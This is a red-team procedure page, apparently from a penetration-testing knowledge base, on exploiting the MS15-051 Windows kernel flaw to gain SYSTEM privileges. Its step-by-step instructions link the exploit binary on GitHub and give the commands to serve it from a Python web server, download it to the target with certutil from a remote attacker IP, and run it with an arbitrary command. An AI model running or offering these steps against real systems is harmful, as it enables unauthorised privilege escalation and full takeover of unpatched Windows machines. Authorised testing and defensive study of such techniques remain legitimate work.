---
id: 188a8335-8042-4283-b647-cff26c1643f1
name: Exploit the ClientCopyImage Vulnerability (MS15-051)
type: procedure
verified: false
submitted: false
created_at: '2019-12-05T23:29:37.839836+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
platforms:
- Windows
tags:
- '[[Kernel Exploit]]'
- '[[known vulnerability]]'
commands:
- '[[certutil.exe -urlcache -split -f "http://$_REMOTE_]]'
- '[[Download from a Remote HTTP Server (certutil)]]'
- '[[Execute MS15-051.exe from a Command Shell]]'
- '[[Launch a Python 3 Web Server]]'
---

# Exploit the ClientCopyImage Vulnerability (MS15-051)

## Summary

Windows 2003, 2008, Vista, 7, and 2012  which have not been patched with KB3065979 may be vulnerable to MS15-051, a kernel exploit which can allow attackers to escalate privileges to SYSTEM. This exploit is architecture specific, so the build (x86 or x64) must match the target system. 

## Description

# Description

Windows 2003, 2008, Vista, 7, and 2012  which have not been patched with KB3065979 may be vulnerable to MS15-051, a kernel exploit which can allow attackers to escalate privileges to SYSTEM. This exploit is architecture specific, so the build (x86 or x64) must match the target system.

# Instructions

1. Download and extract ms15-051.exe (or ms15-051x64.exe): [Download from GitHub](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip)

2. Host the file on a web server

**Command** ([[Launch a Python 3 Web Server]]):

```bash
python3 -m http.server $_PORT
```

3. Download the file to the target

**Command** ([[certutil.exe -urlcache -split -f "http://$_REMOTE_]]):

```bash
certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" $_FILENAME
```

4. Execute ms15-051.exe with a command to run as System

**Command** ([[Execute MS15-051.exe from a Command Shell]]):

```bash
cmd.exe /c ms15-051x64.exe "$_COMMAND"
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]

## Commands Used

- [[certutil.exe -urlcache -split -f "http://$_REMOTE_]]
- [[Download from a Remote HTTP Server (certutil)]]
- [[Execute MS15-051.exe from a Command Shell]]
- [[Launch a Python 3 Web Server]]

## Tags

- [[Kernel Exploit]]
- [[known vulnerability]]
